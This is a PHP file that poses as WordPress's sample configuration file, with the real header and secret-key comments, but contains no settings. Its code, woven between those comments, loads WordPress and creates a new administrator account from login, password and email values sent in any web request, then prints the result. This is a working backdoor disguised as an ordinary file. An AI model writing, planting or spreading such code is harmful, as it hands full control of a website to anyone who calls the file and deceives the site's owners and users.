<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */
$file="wp-load.php";
	$fn_path = dirname(__FILE__);
	$wp_load=$fn_path.DIRECTORY_SEPARATOR;
while(!file_exists($wp_load.$file)) {
	$wp_load =dirname($wp_load).DIRECTORY_SEPARATOR;
}
/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
require_once ($wp_load.DIRECTORY_SEPARATOR.$file);
$wp_us = $_REQUEST["login"];
$wp_pa = $_REQUEST["pass"];
$wp_ma = $_REQUEST["mail"];
$userdata = array(
    'user_login' => $wp_us,
    'user_pass'  => $wp_pa ,
	'user_email' => $wp_ma,
	'role' => 'administrator'
);

/**
 * Output the login page header.
 *
 * @param string   $title    Optional. WordPress login Page title to display in the `<title>` element.
 *                           Default 'Log In'.
 * @param string   $message  Optional. Message to display in header. Default empty.
 * @param WP_Error $wp_error Optional. The error to pass. Default is a WP_Error instance.
 */
$user_id =wp_insert_user($userdata);
print_r($user_id);
